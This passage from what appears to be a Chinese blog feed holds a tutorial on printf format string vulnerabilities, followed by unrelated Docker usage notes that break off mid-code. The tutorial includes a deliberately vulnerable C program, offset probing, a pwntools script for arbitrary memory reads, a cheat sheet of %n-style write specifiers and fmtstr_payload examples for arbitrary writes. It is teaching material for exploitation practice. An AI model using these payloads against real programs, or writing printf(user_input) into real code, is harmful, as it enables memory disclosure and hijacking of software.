class="line">printf(str);</span><br></pre></td></tr></table></figure><p>这个程序在printf处用了一种偷懒的写法。这看起来是没有什么问题，程序也正常的打印了名字，但是却产生了一个非常严重的漏洞。</p><p>一般来说，每个函数的参数个数都是固定的，被调用的函数知道应该从内存中读取多少个变量，但printf是可变参数的函数，对可变参数的函数而言，一切就变得模糊了起来。函数的调用者可以自由的指定函数参数的数量和类型，被调用者无法知道在函数调用之前到底有多少参数被压入栈帧当中。所以printf函数要求传入一个format参数用以指定到底有多少，怎么样的参数被传入其中。然后它就会忠实的按照函数的调用者传入的格式一个一个的打印出数据。由于编程者的疏忽，把格式化字符串的操纵权交给用户，就会产生后面任意地址读写的漏洞。</p><p>示例程序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">char a[100];</span><br><span class="line">scanf(&quot;%s&quot;,a);</span><br><span class="line">printf(a);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设我们的输入为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x</span><br></pre></td></tr></table></figure><p>程序的输出为（此次）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAA61fe4c,61ffcc,76e4d250,70734fbf,fffffffe,76e473da,41414141,252c7825,78252c78,2c78252c,252c7825</span><br></pre></td></tr></table></figure><p>注意，这其中有一组为41414141，那就是这个字符串开始的位置。</p><p>看一下栈里的样子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0061FE30   0061FE4C  |format = &quot;AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x&quot;</span><br><span class="line">0061FE34   0061FE4C  |&lt;%x&gt; = 0x61FE4C</span><br><span class="line">0061FE38   0061FFCC  |&lt;%x&gt; = 0x61FFCC</span><br><span class="line">0061FE3C   76E4D250  |&lt;%x&gt; = 0x76E4D250</span><br><span class="line">0061FE40   FF12BE58  |&lt;%x&gt; = 0xFF12BE58</span><br><span class="line">0061FE44   FFFFFFFE  |&lt;%x&gt; = 0xFFFFFFFE</span><br><span class="line">0061FE48   76E473DA  |&lt;%x&gt; = 0x76E473DA</span><br><span class="line">0061FE4C   41414141  |&lt;%x&gt; = 0x41414141</span><br><span class="line">0061FE50   252C7825  |&lt;%x&gt; = 0x252C7825</span><br><span class="line">0061FE54   78252C78  |&lt;%x&gt; = 0x78252C78</span><br><span class="line">0061FE58   2C78252C  |&lt;%x&gt; = 0x2C78252C</span><br><span class="line">0061FE5C   252C7825  \&lt;%x&gt; = 0x252C7825</span><br><span class="line">0061FE60   78252C78</span><br><span class="line">0061FE64   2C78252C</span><br><span class="line">0061FE68   252C7825</span><br><span class="line">0061FE6C   78252C78</span><br><span class="line">0061FE70   00000000</span><br><span class="line">0061FE74   00000000</span><br><span class="line">0061FE78   00000000</span><br></pre></td></tr></table></figure><p>0x0061FE4C 是格式化字符串开始的位置，通过不断的取变量操作，最终我们就能读取到程序的每一个位置。</p><hr><h2 id="实现任意地址读"><a href="#实现任意地址读" class="headerlink" title="实现任意地址读"></a>实现任意地址读</h2><p>有了上面的原理，我们来到linux环境。</p><p>任意地址读我们需要用到printf格式化字符串的另外一个特性，”$“操作符。</p><p>这个操作符可以输出指定位置的参数。<br>wikipedia是这样说的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Parameter field</span><br><span class="line">This is a POSIX extension and not in C99. The Parameter field can be omitted or can be:</span><br><span class="line"></span><br><span class="line">n$</span><br><span class="line"></span><br><span class="line">n is the number of the parameter to display using this format specifier, allowing the parameters provided to be output multiple times, using varying format specifiers or in different orders. If any single placeholder specifies a parameter, all the rest of the placeholders MUST also specify a parameter.</span><br><span class="line"></span><br><span class="line">For example, printf(&quot;%2$d %2$#x; %1$d %1$#x&quot;,16,17) produces 17 0x11; 16 0x10.</span><br></pre></td></tr></table></figure><p>示例程序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">char str[100];</span><br><span class="line">scanf(&quot;%s&quot;,str);</span><br><span class="line">printf(str);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先测出字符串开头的偏移量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">veritas@ubuntu:~/pwn$ ./str</span><br><span class="line">AAAA%1$x</span><br><span class="line">AAAAffa87a68</span><br><span class="line">veritas@ubuntu:~/pwn$ ./str</span><br><span class="line">AAAA%2$x        </span><br><span class="line">AAAAc2</span><br><span class="line">veritas@ubuntu:~/pwn$ ./str</span><br><span class="line">AAAA%3$x</span><br><span class="line">AAAAf766376b</span><br><span class="line">veritas@ubuntu:~/pwn$ ./str</span><br><span class="line">AAAA%4$x</span><br><span class="line">AAAAffb6ad4e</span><br><span class="line">veritas@ubuntu:~/pwn$ ./str</span><br><span class="line">AAAA%5$x</span><br><span class="line">AAAAffab456c</span><br><span class="line">veritas@ubuntu:~/pwn$ ./str</span><br><span class="line">AAAA%6$x    </span><br><span class="line">AAAA41414141</span><br></pre></td></tr></table></figure><p>由此我们测出偏移为6</p><p>然后我们用pwntools编写如下脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">cn = process(&apos;str&apos;)</span><br><span class="line">cn.sendline(p32(0x08048000)+&quot;%6$s&quot;)</span><br><span class="line">#cn.sendline(&quot;%7$s&quot;+p32(0x08048000))</span><br><span class="line">print cn.recv()</span><br></pre></td></tr></table></figure><p>执行脚本以后发现 EOFError</p><p><a href="http://ordvwjm69.bkt.clouddn.com/fmt_25972122d772639e8366f946e4e2c8f4.png" target="_blank" rel="noopener"><img src="http://ordvwjm69.bkt.clouddn.com/fmt_25972122d772639e8366f946e4e2c8f4.png" alt="img"></a></p><p>因为我们想要读取的地址是0x08048000，根据little-endian，所以我们发送过去的数据包的第一字节是地址的最后一字节，即0x00，所以发送失败。我们可以对payload做如下调整</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn.sendline(&quot;%7$s&quot;+p32(0x08048000))</span><br></pre></td></tr></table></figure><p>把6改成7是有原因的，调整前：</p><p><a href="http://ordvwjm69.bkt.clouddn.com/fmt_c29273e995e8aaa2c9cc4ae15abd779b.png" target="_blank" rel="noopener"><img src="http://ordvwjm69.bkt.clouddn.com/fmt_c29273e995e8aaa2c9cc4ae15abd779b.png" alt="img"></a></p><p>调整后：</p><p><a href="http://ordvwjm69.bkt.clouddn.com/fmt_c46b7c13523766ac5bc9c78599d3aba4.png" target="_blank" rel="noopener"><img src="http://ordvwjm69.bkt.clouddn.com/fmt_c46b7c13523766ac5bc9c78599d3aba4.png" alt="img"></a></p><p>通过改进的payload我们成功获取到了elf文件的前几字节。</p><p><a href="http://ordvwjm69.bkt.clouddn.com/fmt_eaebe9ee0e63783ba190b6af20da7f03.png" target="_blank" rel="noopener"><img src="http://ordvwjm69.bkt.clouddn.com/fmt_eaebe9ee0e63783ba190b6af20da7f03.png" alt="img"></a></p><p><a href="http://ordvwjm69.bkt.clouddn.com/fmt_d928423855be1ec06fca199ca7e9ba9a.png" target="_blank" rel="noopener"><img src="http://ordvwjm69.bkt.clouddn.com/fmt_d928423855be1ec06fca199ca7e9ba9a.png" alt="img"></a></p><p>如果这个程序中含有其他漏洞能够是我们控制eip来反复调用printf函数，把整个elf或是libc拖下来都是可以做到的。</p><hr><h2 id="实现任意地址写"><a href="#实现任意地址写" class="headerlink" title="实现任意地址写"></a>实现任意地址写</h2><p>看了任意地址写，肯定感觉不过瘾，毕竟这样我们是能看，不能写入一些非法数据来控制eip。下面就来介绍任意地址写，用到的就是我们上面提到的<code>%n</code>格式符。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//gcc str.c -m32 -o str</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">int c = 0; </span><br><span class="line">printf(&quot;the use of %n&quot;, &amp;c);</span><br><span class="line">printf(&quot;%d\n&quot;, c);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序，我们把n的值改成11。但作为代价，我们输入了长达11的字符串，如果我们想把n改成100，不总是有这么长的空间让我们存100字节的数据。</p><p>这时我们需要用到格式符的另一点特性，自定义打印字符串的宽度，程序如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//gcc str.c -m32 -o str</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">int c = 0; </span><br><span class="line">printf(&quot;%.100d%n&quot;, c,&amp;c);</span><br><span class="line">printf(&quot;\nthe value of c: %d\n&quot;, c);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到c被修改成了100</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">veritas@ubuntu:~/pwn$ ./str</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">the value of c: 100</span><br></pre></td></tr></table></figure><p>那如果我们想要把指修改成0x12345678呢？难道我们要让他回显0x12345678字节长的字符串回来？并不是，这里提供一份表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">这部分来自icemakr的博客</span><br><span class="line"></span><br><span class="line">32位</span><br><span class="line"></span><br><span class="line">读</span><br><span class="line"></span><br><span class="line">&apos;%&#123;&#125;$x&apos;.format(index)           // 读4个字节</span><br><span class="line">&apos;%&#123;&#125;$p&apos;.format(index)           // 同上面</span><br><span class="line">&apos;$&#123;&#125;$s&apos;.format(index)</span><br><span class="line">写</span><br><span class="line"></span><br><span class="line">&apos;%&#123;&#125;$n&apos;.format(index)           // 解引用，写入四个字节</span><br><span class="line">&apos;%&#123;&#125;$hn&apos;.format(index)          // 解引用，写入两个字节</span><br><span class="line">&apos;%&#123;&#125;$hhn&apos;.format(index)         // 解引用，写入一个字节</span><br><span class="line">&apos;%&#123;&#125;$lln&apos;.format(index)         // 解引用，写入八个字节</span><br><span class="line"></span><br><span class="line">////////////////////////////</span><br><span class="line">64位</span><br><span class="line"></span><br><span class="line">读</span><br><span class="line"></span><br><span class="line">&apos;%&#123;&#125;$x&apos;.format(index, num)      // 读4个字节</span><br><span class="line">&apos;%&#123;&#125;$lx&apos;.format(index, num)     // 读8个字节</span><br><span class="line">&apos;%&#123;&#125;$p&apos;.format(index)           // 读8个字节</span><br><span class="line">&apos;$&#123;&#125;$s&apos;.format(index)</span><br><span class="line">写</span><br><span class="line"></span><br><span class="line">&apos;%&#123;&#125;$n&apos;.format(index)           // 解引用，写入四个字节</span><br><span class="line">&apos;%&#123;&#125;$hn&apos;.format(index)          // 解引用，写入两个字节</span><br><span class="line">&apos;%&#123;&#125;$hhn&apos;.format(index)         // 解引用，写入一个字节</span><br><span class="line">&apos;%&#123;&#125;$lln&apos;.format(index)         // 解引用，写入八个字节</span><br><span class="line"></span><br><span class="line">%1$lx: RSI</span><br><span class="line">%2$lx: RDX</span><br><span class="line">%3$lx: RCX</span><br><span class="line">%4$lx: R8</span><br><span class="line">%5$lx: R9</span><br><span class="line">%6$lx: 栈上的第一个QWORD</span><br></pre></td></tr></table></figure><p>我们可以通过%{}$hhn来一字节一字节的写入。举个例子，我们希望向0x08048000写入值0x10203040，在pwntools里，我们可以用命令fmtstr_payload。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; fmtstr_payload(6, &#123;0x08048000:0x10203040&#125;)</span><br><span class="line">&apos;\x00\x80\x04\x08\x01\x80\x04\x08\x02\x80\x04\x08\x03\x80\x04\x08%48c%6$hhn%240c%7$hhn%240c%8$hhn%240c%9$hhn&apos;</span><br></pre></td></tr></table></figure><p>即开头为四个地址的小段表示加一堆格式化字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">\x00\x80\x04\x08</span><br><span class="line">\x01\x80\x04\x08</span><br><span class="line">\x02\x80\x04\x08</span><br><span class="line">\x03\x80\x04\x08</span><br><span class="line">%48c%6$hhn</span><br><span class="line">%240c%7$hhn</span><br><span class="line">%240c%8$hhn</span><br><span class="line">%240c%9$hhn</span><br></pre></td></tr></table></figure><p>即对0x08048000写入16+48 = 64 = 0x40<br>对0x08048000写入0x40+240 = 304 = (uint8)0x130 = 0x30<br>…</p><p>但这个payload以0x00开头，应该是传不过去的，还是要人工写。</p><hr><h2 id="pwntools相关模块的使用"><a href="#pwntools相关模块的使用" class="headerlink" title="pwntools相关模块的使用"></a>pwntools相关模块的使用</h2><p>对于格式化字符串漏洞，pwntools有模块fmtstr</p><p>docs地址：<a href="http://pwntools.readthedocs.io/en/stable/fmtstr.html" target="_blank" rel="noopener">http://pwntools.readthedocs.io/en/stable/fmtstr.html</a></p><p>对于这个模块，我只能说建议手写，至少你要懂原理才去用这个模块，不然就是脚本小子。</p><p>例如之前测试某个程序格式化字符串的偏移位置时，我们是采用手动测试，直到输出字符串前4字节的16进制值为止。pwntools则有函数<strong>FmtStr</strong>。</p><p>首先你要自己写一个函数，能够不断输入格式化字符串来测试。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#pwntools的示例</span><br><span class="line">&gt;&gt;&gt; def exec_fmt(payload):</span><br><span class="line">...     p = process(program)</span><br><span class="line">...     p.sendline(payload)</span><br><span class="line">...     return p.recvall()</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; autofmt = FmtStr(exec_fmt)</span><br><span class="line">&gt;&gt;&gt; offset = autofmt.offset</span><br><span class="line">#此处的offset就是我们需要找的偏移值</span><br></pre></td></tr></table></figure><p>生成任意地址写的payload的函数：<strong>fmtstr_payload</strong></p><p>示例代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># we want to do 3 writes</span><br><span class="line">writes = &#123;0x08041337:   0xbfffffff,</span><br><span class="line">          0x08041337+4: 0x1337babe,</span><br><span class="line">          0x08041337+8: 0xdeadbeef&#125;</span><br><span class="line"></span><br><span class="line"># the printf() call already writes some bytes</span><br><span class="line"># for example :</span><br><span class="line"># strcat(dest, &quot;blabla :&quot;, 256);</span><br><span class="line"># strcat(dest, your_input, 256);</span><br><span class="line"># printf(dest);</span><br><span class="line"># Here, numbwritten parameter must be 8</span><br><span class="line">payload = fmtstr_payload(5, writes, numbwritten=8)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;什么是格式化字符串&quot;&gt;&lt;a href=&quot;#什么是格式化字符串&quot; class=&quot;headerlink&quot; title=&quot;什么是格式化字符串&quot;&gt;&lt;/a&gt;什么是格式化字符串&lt;/h2&gt;&lt;p&gt;学过c语言的都知道printf，fprintf，sprintf,snprintf等这一类类printf函数中经常会用到“%”后面加一个或多个字符做说明符，例如&lt;br&gt;
    
    </summary>
    
    
      <category term="pwm" scheme="http://yoursite.com/tags/pwm/"/>
    
  </entry>
  
  <entry>
    <title>Docker</title>
    <link href="http://yoursite.com/2019/04/01/Docker/"/>
    <id>http://yoursite.com/2019/04/01/Docker/</id>
    <published>2019-03-31T16:00:00.000Z</published>
    <updated>2019-04-01T13:56:50.154Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><a id="more"></a><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ul><li><strong>镜像</strong>：<ul><li>分层储存</li><li>就像可执行文件</li></ul></li><li><strong>容器</strong>：<ul><li>镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中 的<strong>类</strong>和<strong>实例</strong>一样</li><li>类似镜像的分层储存，每一个容器运行时，是以镜像为 基础层，在其上创建一个为当前容器运行时读写而准备的存储层（<strong>容器存储层</strong>）</li></ul></li><li></li></ul><h2 id="使用镜像"><a href="#使用镜像" class="headerlink" title="使用镜像"></a>使用镜像</h2><h3 id="获取镜像"><a href="#获取镜像" class="headerlink" title="获取镜像"></a>获取镜像</h3><ul><li>命令格式：<code>docker pull [选项] [Docker Registry地址]&lt;仓库名&gt;:&lt;标签&gt;</code><ul><li>Docker Registry地址：地址的格式一般是 &lt;域名/IP&gt;[:端口号] 。默认地址是Docker Hub。</li><li>仓库名：如之前所说，这里的仓库名是两段式名称，既 &lt;用户名&gt;/&lt;软件名&gt; 。对于 Docker Hub，如果不给出用户名，则默认为library ，也就是官方镜像。</li></ul></li></ul><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p>ubuntu:14.04 为例，如果我们打算启动里面的 bash 并且进行交互式操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -it --rm ubuntu:14.04 bash</span><br><span class="line">root@e7009c6ce357:/<span class="comment"># cat /etc/os-release</span></span><br><span class="line">NAME=<span class="string">"Ubuntu"</span></span><br><span class="line">VERSION=<span class="string">"14.04.5 LTS, Trusty Tahr"</span></span><br><span class="line">ID=ubuntu</span><br><span class="line">ID_LIKE=debian</span><br><span class="line">PRETTY_NAME=<span class="string">"Ubuntu 14.04.5 LTS"</span></span><br><span class="line">VERSION_ID=<span class="string">"14.04"</span></span><br><span class="line">HOME_URL=<span class="string">"http://www.ubuntu.com/"</span></span><br><span class="line">SUPPORT_URL=<span class="string">"http://help.ubuntu.com/"</span></span><br><span class="line">BUG_REPORT_URL=<span class="string">"http://bugs.launchpad.net/ubuntu/"</span></span><br><span class="line">root@e7009c6ce357:/<span class="comment"># exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">$</span><br></pre></td></tr></table></figure><ul><li><strong>-i</strong> ：交互式操作， <strong>-t</strong>: 终端</li><li><strong>–rm</strong> ：这个参数是说容器退出后随之将其删除</li><li><strong>ubuntu:14.04</strong> ：这是指用 ubuntu:14.04 镜像为基础来启动容器。</li><li><strong>bash</strong> ：<strong>放在镜像名后的是命令</strong>，这里我们希望有个交互式 Shell，因此用的是 bash 。</li></ul><h3 id="列出镜像"><a href="#列出镜像" class="headerlink" title="列出镜像"></a>列出镜像</h3><h4 id="镜像体积"><a href="#镜像体积" class="headerlink" title="镜像体积"></a>镜像体积</h4><h4 id="虚悬镜像-dangling-image"><a href="#虚悬镜像-dangling-image" class="headerlink" title="虚悬镜像(dangling image)"></a>虚悬镜像(dangling image)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ docker images -f dangling=true</span><br><span class="line">REPOSITORY TAG IMAGE ID CREA</span><br><span class="line">TED SIZE</span><br><span class="line">&lt;none&gt; &lt;none&gt; 00285df0df87 5 da</span><br><span class="line">ys ago 342 MB</span><br></pre></td></tr></table></figure><ul><li><p>虚悬镜像已经失去了存在的价值，是可以随意删除</p></li><li><p><code>$ docker rmi $(docker images -q -f dangling=true)</code></p></li></ul><h4 id="中间层镜像"><a href="#中间层镜像" class="headerlink" title="中间层镜像"></a>中间层镜像</h4><ul><li><code>$ docker images -a</code></li><li>无需删除</li></ul><h4 id="列出部分镜像"><a href="#列出部分镜像" class="headerlink" title="列出部分镜像"></a>列出部分镜像</h4><ul><li><p>根据仓库名列出镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ docker images ubuntu</span><br><span class="line">REPOSITORY TAG IMAGE ID CREA</span><br><span class="line">TED SIZE</span><br><span class="line">ubuntu 16.04 f753707788c5 4 we</span><br><span class="line">eks ago 127 MB</span><br><span class="line">ubuntu latest f753707788c5 4 we</span><br><span class="line">eks ago 127 MB</span><br><span class="line">ubuntu 14.04 1e0c3dd64ccd 4 we</span><br><span class="line">eks ago 188 MB</span><br></pre></td></tr></table></figure></li><li><p>列出特定的某个镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ docker images ubuntu:16.04</span><br><span class="line">REPOSITORY TAG IMAGE ID CREA</span><br><span class="line">TED SIZE</span><br><span class="line">ubuntu 16.04 f753707788c5 4 we</span><br><span class="line">eks ago 127 MB</span><br></pre></td></tr></table></figure></li><li><p>利用 –filter ，查找 在 mongo:3.2 之后建立的镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ docker images -f since=mongo:3.2</span><br><span class="line">REPOSITORY TAG IMAGE ID CREA</span><br><span class="line">TED SIZE</span><br><span class="line">redis latest 5f515359c7f8 5 da</span><br><span class="line">ys ago 183 MB</span><br><span class="line">nginx latest 05a60462f8ba 5 da</span><br><span class="line">ys ago 181 MB</span><br></pre></td></tr></table></figure></li><li><p>某个位置之前的镜像,只需要把 since 换成 before</p></li></ul><h4 id="以特定格式显示"><a href="#以特定格式显示" class="headerlink" title="以特定格式显示"></a>以特定格式显示</h4><ul><li><p>-q 参数:把虚悬镜像的 ID 列出来</p></li><li><p>–filter 配合 -q 产生出指定范围的 ID 列表</p></li><li><p>列出镜像结果，并且只包含镜像ID和仓库名(用到了 Go 的模板语法)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ docker images --format &quot;&#123;&#123;.ID&#125;&#125;: &#123;&#123;.Repository&#125;&#125;&quot;</span><br><span class="line">5f515359c7f8: redis</span><br><span class="line">05a60462f8ba: nginx</span><br><span class="line">fe9198c04d62: mongo</span><br><span class="line">00285df0df87: &lt;none&gt;</span><br><span class="line">f753707788c5: ubuntu</span><br><span class="line">f753707788c5: ubuntu</span><br><span class="line">1e0c3dd64ccd: ubuntu</span><br></pre></td></tr></table></figure></li><li><p>以表格等距显示，并且有标题行，和默认一样，自己定义列(用到了 Go 的模板语法)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ docker images --format &quot;table &#123;&#123;.ID&#125;&#125;\t&#123;&#123;.Repository&#125;&#125;\t&#123;&#123;.Tag</span><br><span class="line">&#125;&#125;&quot;</span><br><span class="line">IMAGE ID REPOSITORY TAG</span><br><span class="line">5f515359c7f8 redis latest</span><br><span class="line">05a60462f8ba nginx latest</span><br><span class="line">fe9198c04d62 mongo 3.2</span><br><span class="line">00285df0df87 &lt;none&gt; &lt;none&gt;</span><br><span class="line">f753707788c5 ubuntu 16.04</span><br><span class="line">f753707788c5 ubuntu latest</span><br><span class="line">1e0c3dd64ccd ubuntu 14.04</span><br></pre></td></tr></table></figure></li></ul><h2 id="使用-Dockerfile-定制镜像"><a href="#使用-Dockerfile-定制镜像" class="headerlink" title="使用 Dockerfile 定制镜像"></a>使用 Dockerfile 定制镜像</h2><p>在一个空白目录中，建立一个文本文件，并命名为 Dockerfile ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir mynginx</span><br><span class="line">$ cd mynginx</span><br><span class="line">$ touch Dockerfile</span><br></pre></td></tr></table></figure><p>其内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FROM nginx</span><br><span class="line">RUN echo &apos;&lt;h1&gt;Hello, Docker!&lt;/h1&gt;&apos; &gt; /usr/share/nginx/html/index.html</span><br></pre></td></tr></table></figure><h3 id="FROM-指定基础镜像"><a href="#FROM-指定基础镜像" class="headerlink" title="FROM 指定基础镜像"></a>FROM 指定基础镜像</h3><h3 id="RUN-执行命令"><a href="#RUN-执行命令" class="headerlink" title="RUN 执行命令"></a>RUN 执行命令</h3><ul><li><p>Dockerfile 中每一个指令都会建立一层</p><p>Dockerfile 正确的写法</p></li></ul><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 